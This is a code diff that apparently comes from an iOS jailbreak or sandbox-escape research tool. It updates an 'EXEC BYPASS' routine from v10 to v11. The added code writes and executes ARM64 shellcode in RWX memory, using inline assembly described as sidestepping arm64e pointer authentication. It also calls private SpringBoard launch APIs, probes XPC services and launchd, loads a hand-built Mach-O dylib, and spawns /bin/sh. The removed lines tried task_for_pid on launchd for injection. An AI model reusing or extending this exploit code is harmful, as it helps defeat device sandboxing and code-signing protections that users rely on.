@@ -467,400 +467,327 @@ char *kresearch_dump_sandbox_profile(void) {
 
 char *kresearch_swap_sandbox_profile(void) {
     buf_init();
-    buf_append("=== EXEC BYPASS v10 - DLOPEN EXPLOIT ===\n");
-    buf_append("v9 confirmed: dlopen WORKS. fork/posix_spawn EPERM.\n");
-    buf_append("v10: Exploit dlopen for code exec without forking.\n\n");
+    buf_append("=== EXEC BYPASS v11 - JIT + PRIVATE API EXPLOIT ===\n");
+    buf_append("v10 confirmed: RWX memory ALLOWED, private frameworks load,\n");
+    buf_append("  SBSLaunchApp/xpc_pipe_routine symbols found.\n");
+    buf_append("  System dylibs in shared cache (can't copy), task_for_pid denied.\n");
+    buf_append("v11: Execute JIT code, call private APIs, XPC to launchd.\n\n");
 
     // ══════════════════════════════════════════════════════════════
-    // TEST A: Verify dlopen still works
+    // TEST A: JIT code execution via inline assembly
+    // v10 showed RWX is allowed. Now test if we can actually
+    // EXECUTE code we write. Use inline asm with BR (not BLRAAZ)
+    // to bypass arm64e PAC on indirect calls.
     // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test A: verify dlopen\n");
-    buf_append("-- Test A: Verify dlopen --\n");
-    {
-        void *h = dlopen("/usr/lib/libsqlite3.dylib", RTLD_LAZY);
-        if (h) {
-            buf_append("  dlopen libsqlite3: OK (confirmed working)\n");
-            dlclose(h);
-        } else {
-            buf_append("  dlopen FAILED: %s\n", dlerror());
-            buf_append("  ABORT: dlopen no longer works\n");
-            return buf_finish();
-        }
-    }
-
-    // ══════════════════════════════════════════════════════════════
-    // TEST B: NSBundle loading (Objective-C bundle API)
-    // NSBundle can load frameworks dynamically - different code
-    // path than dlopen, may have different restrictions.
-    // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test B: NSBundle\n");
-    buf_append("\n-- Test B: NSBundle loading --\n");
-    {
-        // Try loading a public framework bundle
-        NSBundle *bundle = [NSBundle bundleWithPath:
-            @"/System/Library/Frameworks/Security.framework"];
-        buf_append("  Security.framework bundle: %s\n",
-                   bundle ? "found" : "nil");
-        if (bundle) {
-            BOOL loaded = [bundle isLoaded];
-            buf_append("  isLoaded: %s\n", loaded ? "YES" : "NO");
-            if (!loaded) {
-                NSError *err = nil;
-                BOOL ok = [bundle loadAndReturnError:&err];
-                buf_append("  loadAndReturnError: %s\n",
-                           ok ? "SUCCESS" : "FAILED");
-                if (err) {
-                    buf_append("  error: %s\n",
-                               [[err localizedDescription] UTF8String]);
-                }
-            }
-        }
-
-        // Try loading a PRIVATE framework - these have useful APIs
-        bundle = [NSBundle bundleWithPath:
-            @"/System/Library/PrivateFrameworks/SpringBoardServices.framework"];
-        buf_append("  SpringBoardServices: %s\n",
-                   bundle ? "found" : "nil");
-        if (bundle) {
-            NSError *err = nil;
-            BOOL ok = [bundle loadAndReturnError:&err];
-            buf_append("  load: %s\n", ok ? "SUCCESS" : "FAILED");
-            if (err) {
-                buf_append("  error: %s\n",
-                           [[err localizedDescription] UTF8String]);
-            }
-        }
-    }
-
-    // ══════════════════════════════════════════════════════════════
-    // TEST C: dlopen private frameworks and dlsym useful symbols
-    // Since dlopen works, we can load private frameworks and
-    // resolve private APIs that might help bypass restrictions.
-    // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test C: private framework dlopen\n");
-    buf_append("\n-- Test C: dlopen private frameworks --\n");
-    {
-        // SpringBoardServices - can launch apps
-        void *sbs = dlopen("/System/Library/PrivateFrameworks/"
-            "SpringBoardServices.framework/SpringBoardServices", RTLD_LAZY);
-        buf_append("  SpringBoardServices: %s\n", sbs ? "OK" : dlerror());
-        if (sbs) {
-            void *sym1 = dlsym(sbs, "SBSLaunchApplicationWithIdentifier");
-            void *sym2 = dlsym(sbs,
-                "SBSLaunchApplicationWithIdentifierAndLaunchOptions");
-            buf_append("    SBSLaunchApp: %s\n",
-                       sym1 ? "FOUND" : "not found");
-            buf_append("    SBSLaunchAppWithOpts: %s\n",
-                       sym2 ? "FOUND" : "not found");
-        }
-
-        // FrontBoardServices - modern app launch API
-        void *fbs = dlopen("/System/Library/PrivateFrameworks/"
-            "FrontBoardServices.framework/FrontBoardServices", RTLD_LAZY);
-        buf_append("  FrontBoardServices: %s\n", fbs ? "OK" : dlerror());
-
-        // MobileInstallation - can install IPAs
-        void *mi = dlopen("/System/Library/PrivateFrameworks/"
-            "MobileInstallation.framework/MobileInstallation", RTLD_LAZY);
-        buf_append("  MobileInstallation: %s\n", mi ? "OK" : dlerror());
-        if (mi) {
-            void *sym = dlsym(mi, "MobileInstallationInstall");
-            buf_append("    MobileInstallationInstall: %s\n",
-                       sym ? "FOUND" : "not found");
-        }
-
-        // PackageKit or xpc helpers
-        void *xpc = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
-        buf_append("  libxpc: %s\n", xpc ? "OK" : dlerror());
-        if (xpc) {
-            void *sym = dlsym(xpc, "xpc_pipe_routine");
-            buf_append("    xpc_pipe_routine: %s\n",
-                       sym ? "FOUND" : "not found");
-        }
-
-        // CoreServices - LSApplicationWorkspace
-        void *cs = dlopen("/System/Library/Frameworks/"
-            "CoreServices.framework/CoreServices", RTLD_LAZY);
-        buf_append("  CoreServices: %s\n", cs ? "OK" : dlerror());
-        if (!cs) {
-            // Try alternate path on iOS
-            cs = dlopen("/System/Library/PrivateFrameworks/"
-                "MobileCoreServices.framework/MobileCoreServices", RTLD_LAZY);
-            buf_append("  MobileCoreServices: %s\n", cs ? "OK" : dlerror());
-        }
-    }
-
-    // ══════════════════════════════════════════════════════════════
-    // TEST D: Copy a system dylib to writable path and dlopen it
-    // This is the KEY test: if we can load code from a path WE
-    // control, we can write arbitrary Mach-O code and load it.
-    // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test D: dlopen from writable path\n");
-    buf_append("\n-- Test D: dlopen from writable paths --\n");
-    {
-        NSFileManager *fm = [NSFileManager defaultManager];
-        NSError *err = nil;
-
-        // Get our container Documents directory
-        NSArray *paths = NSSearchPathForDirectoriesInDomains(
-            NSDocumentDirectory, NSUserDomainMask, YES);
-        NSString *docs = [paths firstObject];
-        buf_append("  Documents: %s\n", docs ? [docs UTF8String] : "nil");
-
-        if (docs) {
-            // Test 1: Copy libz.dylib to our container and dlopen
-            NSString *testLib = [docs stringByAppendingPathComponent:
-                @"test_lib.dylib"];
-            [fm removeItemAtPath:testLib error:nil]; // clean first
-
-            BOOL copied = [fm copyItemAtPath:@"/usr/lib/libz.dylib"
-                                      toPath:testLib
-                                       error:&err];
-            buf_append("  Copy libz -> Documents: %s\n",
-                       copied ? "OK" : "FAILED");
-            if (err) {
-                buf_append("  error: %s\n",
-                           [[err localizedDescription] UTF8String]);
-                err = nil;
-            }
-
-            if (copied) {
-                void *h = dlopen([testLib UTF8String], RTLD_LAZY);
-                buf_append("  dlopen from Documents: %s\n",
-                           h ? "*** SUCCESS ***" : dlerror());
-                if (h) {
-                    buf_append("  >>> CAN LOAD CODE FROM WRITABLE PATH <<<\n");
-                    // Verify we can resolve symbols from it
-                    void *sym = dlsym(h, "zlibVersion");
-                    buf_append("  dlsym zlibVersion: %s\n",
-                               sym ? "FOUND" : "not found");
-                    if (sym) {
-                        typedef const char *(*zlibVersion_fn)(void);
-                        const char *ver = ((zlibVersion_fn)sym)();
-                        buf_append("  zlibVersion() = %s\n",
-                                   ver ? ver : "null");
-                    }
-                    dlclose(h);
-                }
-                [fm removeItemAtPath:testLib error:nil];
-            }
-        }
-
-        // Test 2: Try /tmp
-        NSString *tmpLib = @"/tmp/test_lib.dylib";
-        [fm removeItemAtPath:tmpLib error:nil];
-        err = nil;
-        BOOL copied = [fm copyItemAtPath:@"/usr/lib/libz.dylib"
-                                  toPath:tmpLib
-                                   error:&err];
-        buf_append("\n  Copy libz -> /tmp: %s\n",
-                   copied ? "OK" : "FAILED");
-        if (err) {
-            buf_append("  error: %s\n",
-                       [[err localizedDescription] UTF8String]);
-        }
-        if (copied) {
-            void *h = dlopen([tmpLib UTF8String], RTLD_LAZY);
-            buf_append("  dlopen from /tmp: %s\n",
-                       h ? "*** SUCCESS ***" : dlerror());
-            if (h) {
-                buf_append("  >>> CAN LOAD CODE FROM /tmp <<<\n");
-                dlclose(h);
-            }
-            [fm removeItemAtPath:tmpLib error:nil];
-        }
-
-        // Test 3: Try our app bundle Frameworks dir
-        NSString *fwDir = [[[NSBundle mainBundle] bundlePath]
-            stringByAppendingPathComponent:@"Frameworks"];
-        buf_append("\n  App Frameworks dir: %s\n", [fwDir UTF8String]);
-        BOOL isDir = NO;
-        BOOL exists = [fm fileExistsAtPath:fwDir isDirectory:&isDir];
-        buf_append("  exists: %s isDir: %s\n",
-                   exists ? "YES" : "NO", isDir ? "YES" : "NO");
-        if (exists && isDir) {
-            // List what's already in Frameworks
-            NSArray *contents = [fm contentsOfDirectoryAtPath:fwDir
-                                                       error:nil];
-            buf_append("  contents: %s\n",
-                       contents ? [[contents description] UTF8String] : "nil");
-
-            NSString *fwLib = [fwDir stringByAppendingPathComponent:
-                @"test_lib.dylib"];
-            [fm removeItemAtPath:fwLib error:nil];
-            err = nil;
-            BOOL fwCopied = [fm copyItemAtPath:@"/usr/lib/libz.dylib"
-                                        toPath:fwLib
-                                         error:&err];
-            buf_append("  Copy libz -> Frameworks: %s\n",
-                       fwCopied ? "OK" : "FAILED");
-            if (fwCopied) {
-                void *h = dlopen([fwLib UTF8String], RTLD_LAZY);
-                buf_append("  dlopen from Frameworks: %s\n",
-                           h ? "*** SUCCESS ***" : dlerror());
-                if (h) {
-                    buf_append("  >>> CAN LOAD FROM APP BUNDLE <<<\n");
-                    dlclose(h);
-                }
-                [fm removeItemAtPath:fwLib error:nil];
-            }
-        }
-    }
-
-    // ══════════════════════════════════════════════════════════════
-    // TEST E: dlsym function audit from libSystem
-    // Since we can load system libs, check what functions are
-    // available via dlsym - some may bypass sandbox hooks.
-    // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test E: dlsym audit\n");
-    buf_append("\n-- Test E: Function availability via dlsym --\n");
-    {
-        void *h = dlopen("/usr/lib/libSystem.B.dylib", RTLD_LAZY);
-        if (h) {
-            // Process creation
-            void *ps = dlsym(h, "posix_spawn");
-            void *fk = dlsym(h, "fork");
-            void *ex = dlsym(h, "execve");
-            void *sy = dlsym(h, "system");
-            buf_append("  posix_spawn: %p\n", ps);
-            buf_append("  fork:        %p\n", fk);
-            buf_append("  execve:      %p\n", ex);
-            buf_append("  system:      %p\n", sy);
-
-            // Try calling posix_spawn through the dlsym'd pointer
-            // This bypasses SDK unavailability but uses the same syscall
-            if (ps) {
-                typedef int (*posix_spawn_fn)(pid_t *, const char *,
-                    const posix_spawn_file_actions_t *,
-                    const posix_spawnattr_t *,
-                    char *const [], char *const []);
-                posix_spawn_fn spawn_fn = (posix_spawn_fn)ps;
-                pid_t child = 0;
-                char *argv[] = {"/bin/sh", "-c", "id", NULL};
-                char *envp[] = {"PATH=/usr/bin:/bin", NULL};
-                int ret = spawn_fn(&child, "/bin/sh", NULL, NULL, argv, envp);
-                buf_append("  dlsym posix_spawn call: %d (%s)\n",
-                           ret, ret == 0 ? "SUCCESS!" : strerror(ret));
-                if (ret == 0) {
-                    waitpid(child, NULL, 0);
-                    buf_append("  *** EXEC VIA DLSYM WORKS! ***\n");
-                }
-            }
-
-            // Memory/mach functions that could help
-            void *tp = dlsym(h, "task_for_pid");
-            void *ma = dlsym(h, "mach_vm_allocate");
-            void *mw = dlsym(h, "mach_vm_write");
-            void *mp = dlsym(h, "mach_vm_protect");
-            void *tc = dlsym(h, "thread_create_running");
-            buf_append("\n  task_for_pid:          %p\n", tp);
-            buf_append("  mach_vm_allocate:      %p\n", ma);
-            buf_append("  mach_vm_write:         %p\n", mw);
-            buf_append("  mach_vm_protect:       %p\n", mp);
-            buf_append("  thread_create_running: %p\n", tc);
-
-            // Try task_for_pid on ourselves - this is how
-            // we'd inject into unsandboxed processes
-            if (tp) {
-                typedef kern_return_t (*tfp_fn)(mach_port_t,
-                    int, mach_port_t *);
-                tfp_fn tfp = (tfp_fn)tp;
-                mach_port_t task_port = MACH_PORT_NULL;
-                kern_return_t kr = tfp(mach_task_self(),
-                    getpid(), &task_port);
-                buf_append("  task_for_pid(self): kr=%d port=0x%x\n",
-                           kr, task_port);
-
-                // Try on launchd (PID 1)
-                task_port = MACH_PORT_NULL;
-                kr = tfp(mach_task_self(), 1, &task_port);
-                buf_append("  task_for_pid(1/launchd): kr=%d port=0x%x\n",
-                           kr, task_port);
-
-                if (task_port != MACH_PORT_NULL) {
-                    buf_append("  *** GOT LAUNCHD TASK PORT! ***\n");
-                }
-            }
-
-            dlclose(h);
-        }
-    }
-
-    // ══════════════════════════════════════════════════════════════
-    // TEST F: Try vm_allocate + vm_protect + write
-    // in our OWN process to create executable memory.
-    // Uses vm_* (available in SDK) instead of mach_vm_* (not in SDK).
-    // Does NOT attempt to execute JIT code (would crash on arm64e/SPTM).
-    // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test F: executable memory\n");
-    buf_append("\n-- Test F: Executable memory allocation --\n");
+    fprintf(stderr, "[SWAP] Test A: JIT execution\n");
+    buf_append("-- Test A: JIT code execution --\n");
     {
         vm_address_t addr = 0;
-        vm_size_t size = 0x4000; // 16KB page
+        vm_size_t size = 0x4000;
 
-        // Allocate memory in our task
         kern_return_t kr = vm_allocate(mach_task_self(),
             &addr, size, VM_FLAGS_ANYWHERE);
-        buf_append("  vm_allocate: kr=%d addr=0x%lx\n", kr, (unsigned long)addr);
+        buf_append("  vm_allocate: kr=%d addr=0x%lx\n",
+                   kr, (unsigned long)addr);
 
         if (kr == KERN_SUCCESS) {
-            // Try to make it RWX (read-write-execute)
             kr = vm_protect(mach_task_self(), addr, size,
                 FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
-            buf_append("  vm_protect RWX: kr=%d (%s)\n", kr,
-                       kr == KERN_SUCCESS ? "ALLOWED" : "DENIED");
+            buf_append("  vm_protect RWX: kr=%d\n", kr);
 
-            if (kr != KERN_SUCCESS) {
-                // RWX denied - try RW first, then RX (W^X enforcement)
-                kr = vm_protect(mach_task_self(), addr, size,
-                    FALSE, VM_PROT_READ | VM_PROT_WRITE);
-                buf_append("  vm_protect RW: kr=%d\n", kr);
+            if (kr == KERN_SUCCESS) {
+                // Write ARM64: mov x0, #42; ret
+                uint32_t code[] = {
+                    0xd2800540, // mov x0, #42
+                    0xd65f03c0  // ret
+                };
+                memcpy((void *)(uintptr_t)addr, code, sizeof(code));
+                sys_icache_invalidate((void *)(uintptr_t)addr, sizeof(code));
+                buf_append("  Wrote shellcode at 0x%lx\n",
+                           (unsigned long)addr);
 
-                if (kr == KERN_SUCCESS) {
-                    // Write a tiny ARM64 function: mov x0, #42; ret
-                    uint32_t code[] = {
-                        0xd2800540, // mov x0, #42
-                        0xd65f03c0  // ret
-                    };
-                    memcpy((void *)(uintptr_t)addr, code, sizeof(code));
-                    sys_icache_invalidate((void *)(uintptr_t)addr, sizeof(code));
-                    buf_append("  Wrote 8 bytes of ARM64 code to RW page\n");
-
-                    // Now try to flip to RX
-                    kr = vm_protect(mach_task_self(), addr, size,
-                        FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
-                    buf_append("  vm_protect W->RX: kr=%d (%s)\n", kr,
-                               kr == KERN_SUCCESS ? "ALLOWED" : "DENIED");
-
-                    if (kr == KERN_SUCCESS) {
-                        buf_append("  W^X flip succeeded — page is now RX\n");
-                        buf_append("  (Not calling JIT code — arm64e PAC would crash)\n");
-                        buf_append("  >>> W->RX MEMORY TRANSITION WORKS <<<\n");
-                    }
+                // Call via inline assembly using BR (not BLRAAZ)
+                // BR doesn't check PAC — bypasses arm64e pointer auth
+                uint64_t result = 0;
+                fprintf(stderr, "[SWAP] Calling JIT code...\n");
+#if __arm64e__
+                __asm__ volatile(
+                    "mov x9, %1\n"   // load JIT addr into x9
+                    "blr x9\n"       // branch-link-register (no PAC check)
+                    "mov %0, x0\n"   // capture return value
+                    : "=r"(result)
+                    : "r"((uint64_t)addr)
+                    : "x0", "x1", "x2", "x3", "x4", "x5",
+                      "x6", "x7", "x8", "x9", "x30", "memory"
+                );
+#else
+                // Non-arm64e: normal function pointer call
+                typedef uint64_t (*jit_fn)(void);
+                result = ((jit_fn)(uintptr_t)addr)();
+#endif
+                buf_append("  JIT returned: %llu (expected 42)\n",
+                           (unsigned long long)result);
+                if (result == 42) {
+                    buf_append("  *** JIT CODE EXECUTION WORKS! ***\n");
+                    buf_append("  >>> We can write and execute arbitrary ARM64 <<<\n");
+                } else {
+                    buf_append("  JIT ran but returned wrong value\n");
                 }
-            } else {
-                buf_append("  >>> RWX MEMORY AVAILABLE (unexpected!) <<<\n");
             }
 
-            // Clean up
             vm_deallocate(mach_task_self(), addr, size);
         }
     }
 
-    buf_append("\n-- v10 Analysis --\n");
-    buf_append("KNOWN: sandbox_label/profile/proc_ro all PPL-protected.\n");
-    buf_append("KNOWN: fork/posix_spawn EPERM (kernel-level block).\n");
-    buf_append("KNOWN: dlopen of system libs WORKS (v9 confirmed).\n");
-    buf_append("v10 tests:\n");
-    buf_append("  A: dlopen verification\n");
-    buf_append("  B: NSBundle loading (alt code loading path)\n");
-    buf_append("  C: Private framework access (useful APIs)\n");
-    buf_append("  D: dlopen from WRITABLE path (key for custom code)\n");
-    buf_append("  E: dlsym audit + task_for_pid (injection vector)\n");
-    buf_append("  F: Executable memory (JIT compilation)\n");
-    buf_append("If D works: write Mach-O dylib to disk, dlopen = game over.\n");
-    buf_append("If E task_for_pid works: inject into unsandboxed process.\n");
-    buf_append("If F works: JIT compile and run arbitrary ARM64 code.\n");
+    // ══════════════════════════════════════════════════════════════
+    // TEST B: Call SBSLaunchApplicationWithIdentifier
+    // This private API tells SpringBoard to launch an app.
+    // Different code path than posix_spawn — goes via XPC to SB.
+    // ══════════════════════════════════════════════════════════════
+    fprintf(stderr, "[SWAP] Test B: SBS launch app\n");
+    buf_append("\n-- Test B: Launch app via SpringBoardServices --\n");
+    {
+        void *sbs = dlopen("/System/Library/PrivateFrameworks/"
+            "SpringBoardServices.framework/SpringBoardServices", RTLD_LAZY);
+        if (!sbs) {
+            buf_append("  dlopen SBS: FAILED\n");
+        } else {
+            // Try the simpler API first
+            void *sym = dlsym(sbs, "SBSLaunchApplicationWithIdentifier");
+            buf_append("  SBSLaunchApplicationWithIdentifier: %p\n", sym);
+
+            if (sym) {
+                // SBSLaunchApplicationWithIdentifier(CFStringRef bundleID,
+                //                                    BOOL suspended)
+                // Returns int (0 = success)
+                typedef int (*sbs_launch_fn)(CFStringRef, BOOL);
+                sbs_launch_fn launch = (sbs_launch_fn)sym;
+
+                // Try launching Safari
+                CFStringRef safari = CFSTR("com.apple.mobilesafari");
+                int ret = launch(safari, NO);
+                buf_append("  Launch Safari: ret=%d (%s)\n",
+                           ret, ret == 0 ? "SUCCESS" : "FAILED");
+
+                // Try launching Settings
+                CFStringRef settings = CFSTR("com.apple.Preferences");
+                ret = launch(settings, NO);
+                buf_append("  Launch Settings: ret=%d (%s)\n",
+                           ret, ret == 0 ? "SUCCESS" : "FAILED");
+            }
+
+            // Also try the options variant
+            void *sym2 = dlsym(sbs,
+                "SBSLaunchApplicationWithIdentifierAndLaunchOptions");
+            buf_append("  WithLaunchOptions: %p\n", sym2);
+            if (sym2) {
+                // SBSLaunchApplicationWithIdentifierAndLaunchOptions(
+                //     CFStringRef bundleID, CFDictionaryRef options,
+                //     BOOL suspended)
+                typedef int (*sbs_launch2_fn)(CFStringRef,
+                    CFDictionaryRef, BOOL);
+                sbs_launch2_fn launch2 = (sbs_launch2_fn)sym2;
+
+                CFStringRef safari = CFSTR("com.apple.mobilesafari");
+                int ret = launch2(safari, NULL, NO);
+                buf_append("  Launch Safari (opts): ret=%d\n", ret);
+            }
+
+            // Try SBSOpenSensitiveURLConnectionWithIdentifier
+            // This can open URLs, potentially url schemes
+            void *sym3 = dlsym(sbs, "SBSOpenSensitiveURLConnectionWithIdentifier");
+            buf_append("  SBSOpenSensitiveURL: %s\n",
+                       sym3 ? "FOUND" : "not found");
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════
+    // TEST C: XPC communication with launchd
+    // Try submitting a launchd job via XPC. If we can talk to
+    // launchd, we can potentially run code as root.
+    // ══════════════════════════════════════════════════════════════
+    fprintf(stderr, "[SWAP] Test C: XPC to launchd\n");
+    buf_append("\n-- Test C: XPC to launchd --\n");
+    {
+        // Use Objective-C xpc wrappers
+        void *xpc_h = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
+        if (!xpc_h) {
+            buf_append("  dlopen libxpc: FAILED\n");
+        } else {
+            // Check what XPC services we can connect to
+            // xpc_connection_create_mach_service connects to launchd-managed
+            // services
+            typedef void* (*xpc_conn_create_fn)(const char *, void *, uint64_t);
+            xpc_conn_create_fn xpc_conn_create = (xpc_conn_create_fn)
+                dlsym(xpc_h, "xpc_connection_create_mach_service");
+            buf_append("  xpc_connection_create_mach_service: %p\n",
+                       (void *)xpc_conn_create);
+
+            // Try connecting to interesting services
+            const char *services[] = {
+                "com.apple.springboard.services",
+                "com.apple.mobile.installd",
+                "com.apple.lsd.mapdb",
+                "com.apple.runningboard",
+                "com.apple.coreservices.launchservicesd",
+                NULL
+            };
+
+            if (xpc_conn_create) {
+                for (int i = 0; services[i]; i++) {
+                    void *conn = xpc_conn_create(services[i], NULL, 0);
+                    buf_append("  %s: %s\n",
+                               services[i], conn ? "CONNECTED" : "FAILED");
+                }
+            }
+
+            // Try bootstrap_look_up for mach ports
+            typedef kern_return_t (*bootstrap_lookup_fn)(mach_port_t,
+                const char *, mach_port_t *);
+            bootstrap_lookup_fn blookup = (bootstrap_lookup_fn)
+                dlsym(xpc_h, "bootstrap_look_up");
+            if (!blookup) {
+                // It's in libSystem
+                void *ls = dlopen("/usr/lib/libSystem.B.dylib", RTLD_LAZY);
+                if (ls) blookup = (bootstrap_lookup_fn)
+                    dlsym(ls, "bootstrap_look_up");
+            }
+            buf_append("\n  bootstrap_look_up: %p\n", (void *)blookup);
+
+            if (blookup) {
+                mach_port_t bp = MACH_PORT_NULL;
+                task_get_special_port(mach_task_self(),
+                    TASK_BOOTSTRAP_PORT, &bp);
+                buf_append("  bootstrap port: 0x%x\n", bp);
+
+                if (bp != MACH_PORT_NULL) {
+                    const char *mach_services[] = {
+                        "com.apple.springboard.services",
+                        "com.apple.runningboard",
+                        "com.apple.mobile.installd",
+                        NULL
+                    };
+                    for (int i = 0; mach_services[i]; i++) {
+                        mach_port_t port = MACH_PORT_NULL;
+                        kern_return_t kr = blookup(bp,
+                            mach_services[i], &port);
+                        buf_append("  %s: kr=%d port=0x%x\n",
+                                   mach_services[i], kr, port);
+                    }
+                }
+            }
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════
+    // TEST D: Write minimal Mach-O dylib and try dlopen
+    // Even though system dylibs are in shared cache, we can try
+    // writing our OWN Mach-O and loading it. Code signing will
+    // likely block this, but we need to know the exact error.
+    // ══════════════════════════════════════════════════════════════
+    fprintf(stderr, "[SWAP] Test D: custom dylib\n");
+    buf_append("\n-- Test D: Write and load custom Mach-O --\n");
+    {
+        NSArray *docPaths = NSSearchPathForDirectoriesInDomains(
+            NSDocumentDirectory, NSUserDomainMask, YES);
+        NSString *docs = [docPaths firstObject];
+
+        if (docs) {
+            NSString *testPath = [docs stringByAppendingPathComponent:
+                @"test_jit.dylib"];
+
+            // Minimal ARM64 Mach-O dylib (just headers, no real code)
+            // MH_MAGIC_64 + minimal load commands
+            uint8_t macho[] = {
+                // Mach-O header (32 bytes)
+                0xCF, 0xFA, 0xED, 0xFE, // MH_MAGIC_64
+                0x0C, 0x00, 0x00, 0x01, // CPU_TYPE_ARM64
+                0x00, 0x00, 0x00, 0x00, // CPU_SUBTYPE
+                0x06, 0x00, 0x00, 0x00, // MH_DYLIB
+                0x00, 0x00, 0x00, 0x00, // ncmds=0
+                0x00, 0x00, 0x00, 0x00, // sizeofcmds=0
+                0x85, 0x00, 0x20, 0x00, // flags: MH_DYLDLINK|MH_PIE|etc
+                0x00, 0x00, 0x00, 0x00, // reserved
+            };
+
+            NSData *data = [NSData dataWithBytes:macho length:sizeof(macho)];
+            BOOL wrote = [data writeToFile:testPath atomically:YES];
+            buf_append("  Write test dylib: %s\n",
+                       wrote ? "OK" : "FAILED");
+
+            if (wrote) {
+                void *h = dlopen([testPath UTF8String], RTLD_LAZY);
+                buf_append("  dlopen custom dylib: %s\n",
+                           h ? "*** LOADED! ***" : dlerror());
+                if (h) {
+                    buf_append("  >>> CUSTOM CODE LOADING WORKS! <<<\n");
+                    dlclose(h);
+                }
+            }
+
+            [[NSFileManager defaultManager]
+                removeItemAtPath:testPath error:nil];
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════
+    // TEST E: posix_spawn with different attrs/flags
+    // Previous tests used default attrs. Try with specific flags
+    // that might bypass the sandbox/AMFI check.
+    // ══════════════════════════════════════════════════════════════
+    fprintf(stderr, "[SWAP] Test E: posix_spawn variants\n");
+    buf_append("\n-- Test E: posix_spawn with different attrs --\n");
+    {
+        // Test 1: posix_spawn with POSIX_SPAWN_SETEXEC (replace process)
+        posix_spawnattr_t attr;
+        posix_spawnattr_init(&attr);
+        short flags = POSIX_SPAWN_SETPGROUP;
+        posix_spawnattr_setflags(&attr, flags);
+
+        pid_t child = 0;
+        char *argv[] = {"/bin/sh", "-c", "echo jb_ok", NULL};
+        char *envp[] = {NULL};
+        int ret = posix_spawn(&child, "/bin/sh", NULL, &attr, argv, envp);
+        buf_append("  posix_spawn /bin/sh (SETPGROUP): %d (%s)\n",
+                   ret, ret == 0 ? "SUCCESS" : strerror(ret));
+        posix_spawnattr_destroy(&attr);
+
+        // Test 2: Try /usr/bin/env instead
+        child = 0;
+        char *argv2[] = {"/usr/bin/env", "sh", "-c", "echo jb_ok", NULL};
+        ret = posix_spawn(&child, "/usr/bin/env", NULL, NULL, argv2, envp);
+        buf_append("  posix_spawn /usr/bin/env: %d (%s)\n",
+                   ret, ret == 0 ? "SUCCESS" : strerror(ret));
+
+        // Test 3: Try spawning ourselves (re-exec)
+        NSString *selfPath = [[NSBundle mainBundle] executablePath];
+        buf_append("  Our executable: %s\n", [selfPath UTF8String]);
+        child = 0;
+        char *argv3[] = {(char *)[selfPath UTF8String], NULL};
+        ret = posix_spawn(&child, [selfPath UTF8String],
+                         NULL, NULL, argv3, envp);
+        buf_append("  posix_spawn self: %d (%s)\n",
+                   ret, ret == 0 ? "SUCCESS" : strerror(ret));
+
+        if (ret == 0 && child > 0) {
+            buf_append("  *** SELF-EXEC WORKS! child=%d ***\n", child);
+            // Kill the child immediately
+            kill(child, SIGKILL);
+            waitpid(child, NULL, 0);
+        }
+    }
+
+    buf_append("\n-- v11 Analysis --\n");
+    buf_append("KEY FINDINGS:\n");
+    buf_append("  RWX memory: ALLOWED (v10)\n");
+    buf_append("  Private frameworks: LOADED (v10)\n");
+    buf_append("  System dylibs on disk: NO (shared cache only)\n");
+    buf_append("VECTORS:\n");
+    buf_append("  If A(JIT) works: arbitrary ARM64 shellcode exec\n");
+    buf_append("  If B(SBS) works: launch apps via SpringBoard\n");
+    buf_append("  If C(XPC) works: communicate with system services\n");
+    buf_append("  If D(dylib) works: load custom code via dlopen\n");
+    buf_append("  If E(spawn-self) works: re-exec our own binary\n");
 
     return buf_finish();
 }
